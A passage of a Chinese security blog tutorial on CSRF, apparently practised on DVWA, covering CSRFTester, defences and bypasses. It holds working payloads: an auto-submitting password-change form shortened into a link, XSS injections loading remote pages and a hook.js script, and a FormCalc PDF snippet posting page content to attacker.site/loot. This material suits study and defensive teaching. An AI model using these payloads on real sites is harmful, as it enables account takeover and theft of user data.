match.&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;攻击思路是试着去构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而获得 token 值，并向服务器发送改密请求，完成攻击。&lt;br&gt;
但是，浏览器并不允许跨域请求，因此，我们可以利用 xss 漏洞&lt;/p&gt;
&lt;p&gt;我们需要利用 xss 了，打开 stroed xss，构造如下代码 &lt;code&gt;&amp;lt;iframe src=&amp;quot;../csrf/&amp;quot;onload=alert(document.getElementsByName(&#39;user_token&#39;)[0].value)&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;  获得 cookie，使用 cookie 完成 csrf&lt;/p&gt;
&lt;p&gt;或者使用 CSRF Token Tracker 的 BP 插件&lt;/p&gt;
&lt;h2 id=&#34;csrf-tester&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf-tester&#34;&gt;#&lt;/a&gt; CSRF tester&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;CSRFTester 是一款 CSRF 漏洞的测试工具，CSRFTester 工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在 CSRFTester 中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在 CSRF 漏洞，当然此款工具也可以被用来进行 CSRF 攻击。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;CSRF tester 监听 8008 端口，注意设置代理～&lt;/p&gt;
&lt;p&gt;&lt;code&gt;10月 29, 2022 9:42:36 下午 org.owasp.webscarab.plugin.proxy.Listener listen 信息: Proxy listening on 127.0.0.1:8008&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214412139.png&#34; alt=&#34;image-20221029214412139&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;p&gt;接着访问可能存在 csrf 的连接～&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214511815.png&#34; alt=&#34;image-20221029214511815&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;点击 start recording&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029214544955.png&#34; alt=&#34;image-20221029214544955&#34;&gt;&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215312102.png&#34; alt=&#34;image-20221029215312102&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;将左侧的参数修改为自己的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030095527035.png&#34; alt=&#34;image-20221030095527035&#34;&gt;&lt;/p&gt;
&lt;p&gt;生成 html&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221029215514582.png&#34; alt=&#34;image-20221029215514582&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;生成的 payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!DOCTYPE &lt;span class=&#34;keyword&#34;&gt;HTML&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;PUBLIC&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;-//W3C//DTD HTML 4.01 Transitional//EN&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;OWASP CRSFTester Demonstration&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;onload&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;javascript:fireForms()&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;language&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;JavaScript&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; pauses = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Array&lt;/span&gt;( &lt;span class=&#34;string&#34;&gt;&amp;quot;53&amp;quot;&lt;/span&gt; );&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pausecomp&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;millis&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; date = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Date&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; curDate = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123; curDate = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Date&lt;/span&gt;(); &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(curDate-date &amp;lt; millis);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;fireForms&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; count = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i&amp;lt;count; i++)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;property&#34;&gt;forms&lt;/span&gt;[i].&lt;span class=&#34;title function_&#34;&gt;submit&lt;/span&gt;();&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;        &lt;span class=&#34;title function_&#34;&gt;pausecomp&lt;/span&gt;(pauses[i]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;/span&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;H2&lt;/span&gt;&amp;gt;&lt;/span&gt;OWASP CRSFTester Demonstration&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;H2&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;method&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;form0&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;action&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://10.128.50.84:18888/dvwa/vulnerabilities/csrf/?password_new=password&amp;amp;password_conf=password&amp;amp;Change=Change&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;&lt;span class=&#34;name&#34;&gt;input&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;type&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;name&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt; &lt;span class=&#34;attr&#34;&gt;value&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;/&amp;gt;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;tag&#34;&gt;&amp;lt;/&lt;span class=&#34;name&#34;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;将它放在我的服务器上： &lt;code&gt;(http://101.35.139.208:9999/shabi233.html)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再以同样的方式生成短链接： &lt;code&gt;http://gg.gg/12ivbn&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;访问后密码就会被修改&lt;/p&gt;
&lt;h2 id=&#34;csrf-防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf-防御&#34;&gt;#&lt;/a&gt; CSRF 防御&lt;/h2&gt;
&lt;p&gt;1. 在请求地址中添加 token 验证&lt;/p&gt;
&lt;input type=&#34;hidden&#34; name=&#34;token&#34; value=&#34;&#34;&gt;
&lt;p&gt;可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，可以在用户登录后放入 session 中，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。&lt;/p&gt;
&lt;p&gt;2. 添加 referer 认证&lt;/p&gt;
&lt;p&gt;如果是以网站 WebA 的网址开头的域名，则说明该请求是来自 WebA 自己的请求，是合法的。&lt;/p&gt;
&lt;p&gt;但 referer 可以伪造&lt;/p&gt;
&lt;p&gt;3. 限制跨域&lt;/p&gt;
&lt;p&gt;阻止不明外域的访问，使用 json api&lt;/p&gt;
&lt;p&gt;使用 JavaScript 发起 AJAX 请求是限制跨域的，并不能通过简单的表单来发送 JSON，所以，通过只接收 JSON 可以很大可能避免 CSRF 攻击。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;同源检测&lt;/li&gt;
&lt;li&gt;Samesite Cookie&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;4. 修改密码时需要原密码&lt;/p&gt;
&lt;h2 id=&#34;csrf绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#csrf绕过&#34;&gt;#&lt;/a&gt; CSRF 绕过&lt;/h2&gt;
&lt;p&gt;1.referer 绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.置空：删除referer内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.子域名：因为开发的正则问题可能存在子域名这种绕过方式，比如 https://baidu.weiyigeek.com 我们让baidu变成子域名这样就绕过了比较弱的正则了&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3.修改域名：https://adafsec.weiyigeek.org https://0dafsec.weiyigeek.org https://Ddafsec.weiyigeek.org利用这种方法也是绕过referer验证的好方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4.参数： https://weiyigeek.org/?https://dafsec.org&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2. 删除 X-CSRFToken 报头然后将 POST 请求改为 GET&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;利用POST和删除“X-CSRFToken”报头测试成功-构造PoC以GET请求来修改邮箱-成功CSRF攻击后利用修改后邮箱重置密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;3.Use Bad PDF&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;FormCalc的get()和post()方法允许过滤CSRF-token,其实就是我们的PDF被浏览器解析，因为插件的原因可以进行请求，我们上传恶意的PDF文件在目标网站这样可以绕过referer甚至CSRF token &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script contentType=&amp;#x27;application/x-formcalc&amp;#x27;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  var content = GET(&amp;quot;https://example.com/Settings.action&amp;quot;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  Post(&amp;quot;http://attacker.site/loot&amp;quot;,content,&amp;quot;text/plain&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;旁路 cookie 注入绕过&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;描述:攻击者可以通过cookie注入绕过双重提交cookie保护 cookie注入的方法:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- CRLF-injection (HTML响应拆分注入漏洞)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- Browser bugs (like CVE-2016-9078 in Firefox)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5.Content-Type 绕过方法&lt;/p&gt;
&lt;p&gt;描述：该类漏洞主要是利用的程序后端没有验证 (Calidate) &lt;code&gt;Content-Type&lt;/code&gt;  头；攻击者只能通过 HTML 表单或 XHR api 发送 “简单” 的内容类型:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;* text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* multipart/form-dat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;xss-csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xss-csrf&#34;&gt;#&lt;/a&gt; xss + csrf&lt;/h2&gt;
&lt;p&gt;selfxss 就是只能对本地客户端产生影响的跨站脚本攻击，举例简单来说就是像获取到的 cookie 是自己的，显然这并没有什么实际危害，但是一旦结合跨站请求伪造则会导致危害升级，并且成为存储型的跨站脚本攻击。&lt;/p&gt;
&lt;h4 id=&#34;stored-xss-csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#stored-xss-csrf&#34;&gt;#&lt;/a&gt; stored xss + csrf&lt;/h4&gt;
&lt;p&gt;即同时存在 xss 和 csrf 的地方&lt;/p&gt;
&lt;p&gt;思路是：在 xss 中插入我们构造的 csrf 的恶意代码的连接，一旦用户访问，我们就可以跳转到 csrf 页面干一些见不得人的事&lt;/p&gt;
&lt;p&gt;1. 使用前面提到过的 csrftester 生成一个 payload，放在自己的服务器上，比如我的服务器为 1.1.1.1，生成的 payload 名字是 haha.html，放在网站根目录下，那么此时完整路径为 &lt;code&gt;1.1.1.1/haha.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2. 在 stroed xss 处插入： &lt;code&gt;&amp;lt;script src=&amp;quot;x&amp;quot; onerror=javascript:window.open(&amp;quot;http://1.1.1.1/haha.html&amp;quot;)&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3. 用户一旦访问，我们 haha.html 中的 csrf 恶意代码就会被执行&lt;/p&gt;
&lt;h4 id=&#34;self-xss-csrf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#self-xss-csrf&#34;&gt;#&lt;/a&gt; self-xss + csrf&lt;/h4&gt;
&lt;p&gt;selfxss 一般只能获取自己的 cookie，但结合 csrf，我们可以获取别人的 cookie。我们在 input 中提交的是 hook.js，用户一旦点击，相当于让别人触发这个 js，cookie 被外带到平台，而 selfxss 则是自己触发 js&lt;/p&gt;
&lt;p&gt;1. 首先准备一个 xss 平台，使用它他提供的 payload： &lt;code&gt;&amp;lt;script src=&amp;quot;http://192.168.38.129:3000/hook.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2. 使用 csrftester 生成我们的 payload，payload 路径和名称参考前一个 &lt;code&gt;1.1.1.1/haha.html&lt;/code&gt; ，但此时 payload 需要做一些修改&lt;/p&gt;
